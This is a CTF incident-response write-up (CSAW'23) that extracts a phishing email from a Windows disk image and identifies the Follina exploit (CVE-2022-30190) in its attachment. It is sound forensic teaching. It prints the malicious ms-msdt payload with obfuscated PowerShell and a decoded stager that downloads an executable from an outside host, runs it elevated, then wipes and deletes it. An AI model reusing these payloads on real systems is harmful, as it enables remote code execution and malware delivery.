# CSAW'23

## Initial Access

> 
> How were they hacked?!?!
>

Tags: __ir__

## Solution
For the following challenges of this series we get a netcat connection and have to answer some questions to retrieve the next flag. The first question is

> (1/4) What is the subject line for suspicious email?

For this we go back to our mounted win10 virtual disk. We are looking for outlook traces and find them in the `Users\johnsnow\Documents\Outlook Files` folder.

```bash
$ ls -la
total 41572
drwxrwxrwx 1 root root     4096 Sep 10 20:33  .
drwxrwxrwx 1 root root     4096 Sep 10 20:37  ..
-rwxrwxrwx 2 root root 42427392 Sep 10 20:42 'Outlook Data File - johnsn0w.pst'
-rwxrwxrwx 2 root root   131072 Sep 10 20:33 '~Outlook Data File - johnsn0w.pst.tmp'
```

We can use [`libpst`](https://www.kali.org/tools/libpst/) to extract the files.

```bash
$ readpst 'Outlook Data File - johnsn0w.pst'
Opening PST file and indexes...
Processing Folder "Deleted Items"
Processing Folder "Inbox"
Processing Folder "Outbox"
Processing Folder "Sent Items"
Processing Folder "Calendar"
Processing Folder "Contacts"
Processing Folder "Journal"
Processing Folder "Notes"
Processing Folder "Tasks"
Processing Folder "Drafts"
Processing Folder "RSS Feeds"
        "Calendar" - 0 items done, 3 items skipped.
Processing Folder "Conversation Action Settings"
Processing Folder "Quick Step Settings"
Processing Folder "Junk Email"
        "Outlook Data File" - 14 items done, 0 items skipped.
        "Contacts" - 0 items done, 2 items skipped.
        "Inbox" - 64 items done, 6 items skipped.
```

So lets look for suspicious mails. We find this one that has a suspicious attachment. So we enter the subject `Monthly Finance Report - July` as answer.

```bash
From "felicia_finance@felicia.com" Mon Aug 14 22:33:16 2023
Received: by ffa7:c058:5c1e:3731:e638:8f0c:c881:b63f with SMTP id o17-80018; Mon, 14 Aug 2023 13:33:16 
Return-Path: 
ARC-Seal: i=1; a=rsa-sha256; t=7082; cv=none; d=felicia.com; s=arc-20160816;b=DEnJzjBxlIqkKM8ebkA6I65ZYF85FUEFQfPgp5oQ0bzT0EZ4gRpbHRkRZuF5AnT1B0WUVasts6jeaDwNrR9PIA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=felicia.com; s=arc-20160816;h=to:subject:message-id:date:from:mime-version:dkim-signature;bh=0OEpc7jZDk0GZqQteVMp/g/TSUCJu5ponHDCziphhUo0==;fh=JPNfJ8ZkCG7INYswms9aNUdRWPl22WSqogSB4GOwBg====;b=
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=felicia.com; s=3335; t=8711; x=277;h=from:to:subject:date:message-id;bh=5G99n9uXS3fTB99Q2n+2C36+hwLAmkNKeq0MO1h/+wpZ==;b=xNwueqFvsIn1alGtzSSE6SwFwIAo1yl/xpXQT6W60Q==
X-Sender-IP: 42.45.211.176
X-Sender: felicia_finance@felicia.com
X-Cross-Received-Date: Mon, 14 Aug 2023 13:33:16 
From: felicia_finance@felicia.com
To: hudsonhustles844@gmail.com
Subject: Monthly Finance Report - July
Date: Mon, 14 Aug 2023 13:33:16 
Status: RO
MIME-Version: 1.0
Content-Type: multipart/mixed;
	boundary="--boundary-LibPST-iamunique-9158815_-_-"


----boundary-LibPST-iamunique-9158815_-_-
Content-Type: text/plain; charset="us-ascii"

Hello Hudson Hustles,

We hope this email finds you well. We sincerely apologize for the delay in sending out our Monthly Finance Report for July. We understand the importance of timely information, and we appreciate your patience in this matter.

**Financial Overview:**
- Total Revenue: $78,450
- Total Expenses: $49,700
- Net Profit: $28,750

**Key Highlights:**
1. Surging Demand for Rentals: This month, we experienced a substantial increase in jet ski rentals, contributing to the boost in our revenue.
2. Streamlined Operational Costs: We've successfully implemented cost-saving measures in various operational areas, leading to greater resource efficiency and a more robust bottom line.
3. Investment Seminar Success: Our Investment Insights team conducted a highly successful seminar on navigating current market trends, receiving rave reviews and attracting potential new clients.

**Outlook for August:**
Looking ahead to August, we remain committed to building on our successes this month. We plan to expand our service offerings and continue growing our client base.

Please don't hesitate to reach out if you have any questions or require more detailed information. We value your partnership and trust in Felicia Finance.

Best regards,
Felicia Finance Team
----boundary-LibPST-iamunique-9158815_-_-
Content-Type: application/octet-stream
Content-Transfer-Encoding: base64
Content-Disposition: attachment; 
        filename*=utf-8''Hudson_Hustles_Financial_Report_July_2023.doc;
        filename="Hudson_Hustles_Financial_Report_July_2023.doc"

UEsDBBQAAAAAAO1qKVcAAAAAAAAAAAAAAAAGAAAAX3JlbHMvUEsDBBQAAAAAAO1qKVcAAAAAAAAA
AAAAAAAJAAAAZG9jUHJvcHMvUEsDBBQAAAAAAO1qKVcAAAAAAAAAAAAAAAAFAAAAd29yZC9QSwME
FAAAAAgA7WopV9+k0mxUAQAAIAUAABMAAABbQ29udGVudF9UeXBlc10ueG1stZTLasMwEEX3hf6D
0TbYSroopcTJoo9lG2j6Aao0TkRlSWgmr7/vOE5DKWkMTbIx2DP33jPCo+F4XbtsCQlt8KUYFH2R
gdfBWD8rxfv0Ob8TGZLyRrngoRQbQDEeXV8Np5sImLHaYynmRPFeStRzqBUWIYLnShVSrYhf00xG
pT/VDORNv38rdfAEnnJqPMRo+AiVWjjKntb8uSVJ4FBkD21jk1UKFaOzWhHX5dKbXyn5LqFg5bYH
5zZijxuEPJjQVP4O2Ole+WiSNZBNVKIXVXOXXIVkpAl6UbOyOG5zgDNUldWw1zduMQUNiHzmtSv2
lVpZ3+viQNo4wPNTtL7d8UDEgksA7Jw7EVbw8XYxih/mnSAV507Vh4PzY+ytOyGINxDa5+Bkjq3N
...
```

> (2/4) What is the SHA1 hash of the attachment?

Ok, for this we need to extract the attachment. We grab the base64 encoded attachment and place it in a file. Then decode the attachment so we can calculate the Sha1 sum.

```bash
$ cat attachment | base64 -d > attachment_decoded
$ sha1sum attachment_decoded
7b0b63e902504bfd7976e3911e054148f335a2e9  attachment_decoded
```

> (3/4) What is the CVE ID for the exploit used by this attachment?

Since we know we have the correct attachment we can upload the decoded file to [`VIRUSTOTAL`](https://www.virustotal.com/gui/home/upload). The scan gives us the CVE ID [`CVE-2022-30190`](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190).

> (4/4) What is the name of the file being downloaded by this exploit?

Lets inspect the actual attachment. We can unpack the `OLE` file with `binwalk` or `7z`. In `./word/_rels/document.xml.rels` we find this interesting bit.

```xml
<Relationship Id="rId996" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://<host omitted>/static?file=static.html!" TargetMode="External"/>
```

This seems to download the next stage, so lets download the file ourselfs.

```bash
$ wget http://<host omitted>/static?file=static.html -O static.html
--2023-09-18 17:46:06--  http://<host omitted>/static?file=static.html
Resolving <host omitted> (<host omitted>)... 172.67.210.233, 104.21.75.34, 2606:4700:3033::ac43:d2e9, ...
Connecting to <host omitted> (<host omitted>)|172.67.210.233|:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: https://<host omitted>/static?file=static.html [following]
--2023-09-18 17:46:06--  https://<host omitted>/static?file=static.html
Connecting to <host omitted> (<host omitted>)|172.67.210.233|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘static.html’
$ cat static.html
<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vaW5mZWN0ZWQtYzIuY3Nhdy5pby9zdGF0aWM/ZmlsZ ...
```

This obviously is obfuscated, so we need to deobfuscate this to make sense out of it. Luckily this is not very hard. A base64 payload is decoded:

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vaW5mZWN0ZWQtYzIuY3Nhdy5pby9zdGF0aWM/ZmlsZT1jb21zLmV4ZSAtT3V0RmlsZSBDOlxVc2Vyc1xQdWJsaWNcY29...=="))
```

When decoding the base64 string we get the following powershell script. And we can submit `coms.exe` as answer to the last question.

```powershell
Invoke-WebRequest -Uri http://<host omitted>/static?file=coms.exe -OutFile C:\Users\Public\coms.exe;Start-Process C:\Users\Public\coms.exe -Verb runAs;Set-Content -Path C:\Users\Public\coms.exe -Value ('0'*((Get-Content -Path C:\Users\Public\coms.exe).Length));Remove-Item -LiteralPath C:\Users\Public\coms.exe;
```

Flag `csawctf{ph15h1n6_15_7h3_m057_c0mm0n_v3c70r}`